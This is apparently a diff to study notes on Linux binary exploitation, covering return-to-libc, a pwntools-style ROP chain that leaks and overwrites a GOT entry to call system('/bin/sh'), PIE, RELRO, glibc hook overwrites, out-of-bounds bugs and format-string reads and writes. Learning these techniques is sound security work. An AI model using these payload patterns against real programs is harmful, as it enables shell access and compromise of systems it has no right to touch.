@@ -400,5 +400,159 @@ At first, GOT is empty -> PLT calls dynamic linker, write GOT with actual addres
 
 ### Return To Library
 
+libc -> functions like system, execve exist <br>
+Use libc function to bypass NX(section that has excute capability) <br>
 
+Can overwrite return address like below 
+
+```
+addr of ("pop rdi; ret")   <= return address
+addr of string "/bin/sh"   <= ret + 0x8
+addr of "system" plt       <= ret + 0x10
+```
+
+### Return Oriented PRogramming
+
+Technically speaking, **system** function will not be recorded on PLT. <br>
+To use it, we need to find the address of mapped libc and calculate function's address <br>
+<br>
+Library file -> entire file is mapped -> all the functions are mapped on process memory <br>
+
+```
+# write(1, read_got, ...)
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
+payload += p64(write_plt)
+
+# read(0, read_got, ...)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
+payload += p64(read_plt)
+
+# read("/bin/sh") == system("/bin/sh")
+payload += p64(pop_rdi)
+payload += p64(read_got + 0x8)
+payload += p64(ret)
+payload += p64(read_plt)
+```
+
+## PIE & RELRO
+
+### PIE
+
+PIE(Position-Independant Executable): Apply ASLR on code section <br><br>
+
+```
+$ ./pie
+buf_stack addr: 0x7ffc85ef37e0
+buf_heap addr: 0x55617ffcb260
+libc_base addr: 0x7f0989d06000
+printf addr: 0x7f0989d6af00
+main addr: 0x55617f1297ba
+$ ./pie
+buf_stack addr: 0x7ffe9088b1c0
+buf_heap addr: 0x55e0a6116260
+libc_base addr: 0x7f9172a7e000
+printf addr: 0x7f9172ae2f00
+main addr: 0x55e0a564a7ba
+$ ./pie
+buf_stack addr: 0x7ffec6da1fa0
+buf_heap addr: 0x5590e4175260
+libc_base addr: 0x7fdea61f2000
+printf addr: 0x7fdea6256f00
+main addr: 0x5590e1faf7ba
+```
+<br>
+When PIE applied, to use code gadget or to access data section, we have to find code base(PIE base) <br>
+
+### RELRO
+
+RELRO(RELocation Read-Only): remove unnecessary write capability on data section <br><br>
+
+Full RELRO: Only have write capability on **data** and **bss** <br>
+When Full RELRO applied, all library functions are binded during binary loading 
+
+### Hook Overwrite
+
+In Glibc(before 2.33 ver), there are hook function pointer for **malloc** and **free** <br>
+
+One-gadget -> Can execute shell with single gadget, but have to satisfy every constaint <br>
+
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
+   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
+   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
+  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
+  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
+  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
+```
+
+On libc, hook functions are defined for debugging purpose(removed for security reason on recent versions) <br>
+
+**malloc** first check **__malloc_hook** and if exists, first execute function that hook points <br>
+
+```
+// __malloc_hook
+void *__libc_malloc (size_t bytes)
+{
+  mstate ar_ptr;
+  void *victim;
+  void *(*hook) (size_t, const void *)
+    = atomic_forced_read (__malloc_hook); // malloc hook read
+  if (__builtin_expect (hook != NULL, 0))
+    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
+#if USE_TCACHE
+  /* int_free also calls request2size, be careful to not pad twice.  */
+  size_t tbytes;
+  checked_request2size (bytes, tbytes);
+  size_t tc_idx = csize2tidx (tbytes);
+  // ...
+}
+```
+
+hooks are defined in libc.so
+
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
+   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
+  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
+  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
+```
+
+These hooks are located at **bss**, **data** section -> can overwrite <br> <br>
+When hook function are executed, parameter are passed together -> can execute like **malloc("/bin/sh")** <br>
+
+## Memory corruption
+
+### Out of Bounds
+
+OOB: Occurs when index value is below zero or exceed array size <br>
+
+OOB -> can lead to arbitrary read, write
+
+## Format String Bug
+
+Format specifier: %n, %c, %s.... <br>
+%n: Calculate the number of printed characters <br>
+
+hh: char size, h: short int size, l: long int sizez, ll: long long int size <br>
+
+```
+scanf("%s", format);
+printf(format);
+```
+
+Then type **%p/%p/%p/%p/%p/%p/%p/%p**
+
+```
+$ ./fsb_stack_read
+Format: %p/%p/%p/%p/%p/%p/%p/%p
+0xa/(nil)/0x7f4dad0bbaa0/(nil)/0x55f04ffdc6b0/0x7025207025207025/0x2520702520702520/0x2070252070252070 
+```
+
+According to x64-64 convention, after rdi, **rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10]** are printed. <br>
+
+Using this... can perform arbitrary read, write <br>
+
+read -> %[n]$s , write -> %[n]$n <br>
 
